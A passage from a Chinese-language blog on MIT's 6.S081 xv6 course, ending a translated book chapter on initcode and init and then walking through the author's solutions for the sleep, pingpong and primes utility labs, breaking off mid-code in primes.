start</span><br><span class="line">start:</span><br><span class="line">        la a0, init</span><br><span class="line">        la a1, argv</span><br><span class="line">        li a7, SYS_exec</span><br><span class="line">        ecall</span><br><span class="line"></span><br><span class="line"># for(;;) exit();</span><br><span class="line">exit:</span><br><span class="line">        li a7, SYS_exit</span><br><span class="line">        ecall</span><br><span class="line">        jal exit</span><br><span class="line"></span><br><span class="line"># char init[] = &quot;/init\0&quot;;</span><br><span class="line">init:</span><br><span class="line">  .string &quot;/init\0&quot;</span><br><span class="line"></span><br><span class="line"># char *argv[] = &#123; init, 0 &#125;;</span><br><span class="line">.p2align 2</span><br><span class="line">argv:</span><br><span class="line">  .long init</span><br><span class="line">  .long 0</span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li>一旦内核完成 <code>exec</code>，它就会在 <code>/init</code> 进程中返回到用户空间。<ul>
<li><code>init</code>  (user&#x2F;init.c:15) 在需要时会创建一个新的控制台设备文件，然后以文件描述符0、1和2的形式打开它。</li>
<li>然后它在控制台上启动一个 shell。这样系统就启动了。</li>
</ul>
</li>
</ul>
<blockquote>
<p>user&#x2F;init.c:15</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> pid, wpid;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(open(<span class="string">&quot;console&quot;</span>, O_RDWR) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    mknod(<span class="string">&quot;console&quot;</span>, CONSOLE, <span class="number">0</span>);</span><br><span class="line">    open(<span class="string">&quot;console&quot;</span>, O_RDWR);</span><br><span class="line">  &#125;</span><br><span class="line">  dup(<span class="number">0</span>);  <span class="comment">// stdout</span></span><br><span class="line">  dup(<span class="number">0</span>);  <span class="comment">// stderr</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init: starting sh\n&quot;</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;init: fork failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">      exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;init: exec sh failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">      <span class="comment">// this call to wait() returns if the shell exits,</span></span><br><span class="line">      <span class="comment">// or if a parentless process exits.</span></span><br><span class="line">      wpid = wait((<span class="type">int</span> *) <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span>(wpid == pid)&#123;</span><br><span class="line">        <span class="comment">// the shell exited; restart it.</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(wpid &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;init: wait returned an error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// it was a parentless process; do nothing.</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="Real-world-现实情况-1"><a href="#Real-world-现实情况-1" class="headerlink" title="Real world 现实情况"></a>Real world 现实情况</h2><ul>
<li><p>在现实世界中，既可以找到宏内核，也可以找到微内核。</p>
<ul>
<li>许多 Unix 内核都是宏内核。例如，Linux 的内核，尽管有些操作系统的功能是作为用户级服务器运行的（如windows系统）。</li>
<li>L4、Minix 和 QNX 等内核是以服务器的形式组织的微内核，并在嵌入式环境中得到了广泛的部署。</li>
<li>大多数操作系统都采用了进程概念，大多数进程都与 xv6 的相似。</li>
</ul>
</li>
<li><p>然而，现代操作系统支持进程可以拥有多个线程，以允许一个进程利用多个CPU。</p>
<ul>
<li>在一个进程中支持多个线程涉及到不少 xv6 没有的机制，包括潜在的接口变化 (如 Linux 的 <code>clone</code>，<code>fork</code> 的变种)，以控制线程所共享进程的那些部分。</li>
</ul>
</li>
</ul>
<h2 id="Exercises-练习-1"><a href="#Exercises-练习-1" class="headerlink" title="Exercises 练习"></a>Exercises 练习</h2><ol>
<li>你可以使用 gdb 来观察 kernel mode 到 user mode 的第一次转换。运行 <code>make qemu-gdb</code>。在同一目录下的另一个窗口中，运行<code>gdb</code>。输入 gdb 命令 <code>break *0x3ffffff10e</code>，这将在内核中跳转到用户空间的 <code>sret</code> 指令处设置一个断点。输入 <code>continue</code>  gdb 命令，gdb 应该在断点处停止，并即将执行 <code>sret</code>。gdb 现在应该显示它正在地址 0x0 处执行，该地址在 <code>initcode.S</code> 的用户空间开始处。</li>
</ol>
<hr>
<ol>
<li><p><a name="ftn1"></a> 与微内核设计理念相对应的理念，这也是一个源自操作系统级别的概念。对于宏内核来说，整个操作系统就是一个整体，包括了进程管理、内存管理、文件系统等等</p>
</li>
<li><p><a name="ftn2"></a> 本文所说的 “多核 “是指多个共享内存但并行执行的 CPU，每个 CPU 都有自己的一套寄存器。本文有时使用多处理器一词作为多核的同义词，但多处理器也可以更具体地指具有多个不同处理器芯片的计算机。</p>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/04/26/6-S081-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/26/6-S081-Lab1/" class="post-title-link" itemprop="url">Lab Utilities</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-26 21:05:06" itemprop="dateCreated datePublished" datetime="2024-04-26T21:05:06+08:00">2024-04-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-04-29 23:32:09" itemprop="dateModified" datetime="2024-04-29T23:32:09+08:00">2024-04-29</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验讲义：<a target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2021/labs/util.html">Lab: Xv6 and Unix utilities (mit.edu)</a></p>
</li>
<li><p>配置实验环境：<a target="_blank" rel="noopener" href="https://pdos.csail.mit.edu/6.828/2021/tools.html">6.S081 &#x2F; Fall 2021 (mit.edu)</a></p>
</li>
<li><p>本实验将让你熟悉 xv6 及其系统调用</p>
</li>
</ul>
<h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><ul>
<li><p>为 xv6 实现 UNIX 程序 sleep；你的 sleep 应该暂停用户指定的刻度数。你的解决方案应该在文件 <code>user/sleep.c</code> 中</p>
</li>
<li><p>一些提示</p>
<ul>
<li>开始前，阅读 xv6 book 的第 1 章</li>
<li>查看 <code>user/</code> 中的一些其他程序，比如 <code>user/echo.c</code>、<code>user\grep.c</code> 和 <code>user/rm.c</code>，看看如何获取传递给程序的命令行参数</li>
<li>如果用户忘记传递参数，sleep 应该打印错误消息</li>
<li>命令行参数以字符串的形式传递；使用 <code>atoi</code> 将其转换为整数</li>
<li>使用系统调用 sleep</li>
<li>确保 main 调用 exit() 退出你的程序</li>
<li>将你的 sleep 程序添加到 Makefile 中的 UPROGS 中；完成后，<code>make qemu</code> 将编译你的程序，你将能从 xv6 shell 运行它</li>
</ul>
</li>
<li><p>关于如何获取传递给程序的命令行参数，我们简单看一下 <code>user/echo.c</code></p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; argc; i++)&#123;</span><br><span class="line">    write(<span class="number">1</span>, argv[i], <span class="built_in">strlen</span>(argv[i]));	<span class="comment">// 命令行参数通过 argv 获得</span></span><br><span class="line">    <span class="keyword">if</span>(i + <span class="number">1</span> &lt; argc)&#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot; &quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>还有一些关于命令行参数的细节是：</p>
<p>argv[0] 总是当前正在执行程序的 filename，argv 的后续指向的是参数字符串，最后以 NULL 结尾</p>
</blockquote>
<ul>
<li>其他就没什么好看的了，这个用户层次的 sleep 的实现很简单，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;Usage: sleep error...\n&quot;</span>);	<span class="comment">// 如果没有传递参数，打印错误消息</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(atoi(argv[<span class="number">1</span>]));	<span class="comment">// 使用系统调用 sleep</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);	<span class="comment">// 调用 exit() 退出 main</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>头文件不能改哦，我从 user&#x2F;echo.c 中 copy 过来的，可能有依赖关系的</p>
</blockquote>
<ul>
<li>修改 Makefile，找到 UPROGS 的位置，添加 sleep</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	$U/_zombie\</span><br><span class="line">	$U/_sleep\</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>make qemu &amp;&amp; sleep 100</strong>， 在 xv6 shell 中运行一下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429205300883.png" class="" title="image-20240429205300883">

<blockquote>
<p>嗯，它确实暂停了！</p>
</blockquote>
<ul>
<li><strong>.&#x2F;grade-lab-util sleep</strong> 进行测试，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429205605891.png" class="" title="image-20240429205605891">

<blockquote>
<p>测试通过！</p>
</blockquote>
<h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><ul>
<li><p>编写一个使用 UNIX 系统调用的程序，两个进程在一对管道上传递一个字节的 <strong>乒乓球</strong></p>
<ul>
<li>父进程向子进程发送 1 字节，子进程打印 <code>&lt;pid&gt;: received ping</code>，子进程将管道上的 1 字节写入父进程，然后退出</li>
<li>父进程从子进程中读取 1 字节，打印 <code>&lt;pid&gt; received pong</code>，然后退出</li>
</ul>
</li>
<li><p>你的解决方案应该在文件 <code>user/pingpong.c</code></p>
</li>
<li><p>一些提示</p>
<ul>
<li>使用 pipe 创建一个管道</li>
<li>使用 fork 创建一个子进程</li>
<li>使用 read 从管道中读取，write 写入到管道</li>
<li>使用 getpid 查找调用进程的进程 ID</li>
<li>在 Makefile 中将程序添加到 UOROGS 中</li>
<li>xv6 上的用户程序具有有限的功能，可以在 <code>user/user.h</code> 中查看调用列表</li>
</ul>
</li>
<li><p>需要注意的是，管道通常是单向的，父子进程之间通过管道相互传送数据，需要创建两个管道</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;Usage pingpong error...&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipefd_father[<span class="number">2</span>], pipefd_child[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd_father) &lt; <span class="number">0</span> || pipe(pipefd_child) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;Usage pipe error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid;</span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;Usage fork error...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[] = <span class="string">&quot;h&quot;</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        close(pipefd_father[<span class="number">1</span>]);	<span class="comment">// 关闭不需要的文件描述符</span></span><br><span class="line">        close(pipefd_child[<span class="number">0</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (read(pipefd_father[<span class="number">0</span>], buf, n) != n) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;child read error...\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (write(pipefd_child[<span class="number">1</span>], buf, n) != n) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;child write error...\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        close(pipefd_child[<span class="number">1</span>]);</span><br><span class="line">        close(pipefd_father[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipefd_father[<span class="number">1</span>], buf, n) != n) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;father write error...\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (read(pipefd_child[<span class="number">0</span>], buf, n) != n) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;father read error...\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());    <span class="comment">// 甚至一个空格也不能少！！！</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改 Makefile 文件</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	$U/_sleep\</span><br><span class="line">	$U/_pingpong\</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>make qemu &amp;&amp; pingpong</strong>，在 xv6 shell 中运行一下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429211445101.png" class="" title="image-20240429211445101">

<blockquote>
<p>符合预期！</p>
</blockquote>
<ul>
<li><strong>.&#x2F;grade-lab-util pingpong</strong> 进行测试，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429211554825.png" class="" title="image-20240429211554825">

<blockquote>
<p>测试通过！</p>
<p>这里插播一条我之前犯的一个错误，导致我检查了很久也没通过测试，最终发现 ……</p>
<p>在父进程打印 <code>&lt;pid&gt;: received pong</code> 时，由于我写成了 <code>printf(&quot;%d:received pong\n&quot;, getpid());</code> 少了一个空格并且我也一直没有察觉，这就导致我测试时总是通不过，所以这些细节问题真的是 ……</p>
</blockquote>
<h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><ul>
<li><p>使用管道编写优质筛选的并发版本。你的目的是使用 pipe 和 fork 来建立管道。第一个进程将数字从 2 到 35 输入管道。对于每个素数，你将创建一个新进程，该进程从其左邻居的管道上读取，并在另一个管道上写，传输给其右邻居</p>
</li>
<li><p>你的解决方案应该在文件 <code>user/primes.c</code> 中</p>
</li>
<li><p>一些提示</p>
<ul>
<li>xv6 的文件描述符和进程数量有限</li>
<li>一个进程应该等待其所有子进程、孙子进程终止</li>
<li>当管道的写入端关闭时，读取端返回 0</li>
<li>在 Makefile 中将程序添加到 UPROGS 中</li>
</ul>
</li>
<li><p>看官方给的描述很懵，但它实际上就是让我们通过 pipe 和 fork 实现一个并发版本的素数筛选器，筛选 2 ~ 35 内的素数</p>
</li>
<li><p>基本原理就是我们在密码学中学到的：[厄拉多塞筛法 - kentle - 博客园 (cnblogs.com)](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/kentle/p/14975035.html#:~:text=%E5%8E%84%E6%8B%89%E5%A4%9A%E5%A1%9E%E7%AD%9B%E7%AE%97%E6%B3%95%EF%BC%88Eratosthenes">https://www.cnblogs.com/kentle/p/14975035.html#:~:text=厄拉多塞筛算法（Eratosthenes</a> Sieve）是一种求素数的方法，由古希腊数学家厄拉多塞提出。 它的原理是，给定一个数 n，从 2,开始依次将 √n n 以内的素数的倍数标记为合数，标记完成后，剩余未被标记的数为素数（从 2 开始）。)</p>
</li>
<li><p>需要注意的时：由于文件描述符有限，所以我们必须在不需要一个文件描述符时果断 close，避免出现错误！</p>
<blockquote>
<p>我们创建了一些进程，每个进程都有一份父进程的文件描述符表的副本，这就导致了文件描述符的数量急剧飙升</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">process</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span> len = <span class="keyword">sizeof</span>(<span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;argc error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipefd[<span class="number">2</span>], pid, status;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;pipe error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid = fork()) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        close(pipefd[<span class="number">1</span>]);</span><br><span class="line">        process(pipefd[<span class="number">0</span>]);</span><br><span class="line">        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        close(pipefd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt; <span class="number">36</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(pipefd[<span class="number">1</span>], &amp;i, len) != len) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;write error\n&quot;</span>, i);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(pipefd[<span class="number">1</span>]);</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">process</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prime, n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((n = read(fd, &amp;prime, len)) == <span class="number">0</span>) &#123;	<span class="comment">// 没有素数了</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n != len) &#123;</span><br><span class="line">        <span 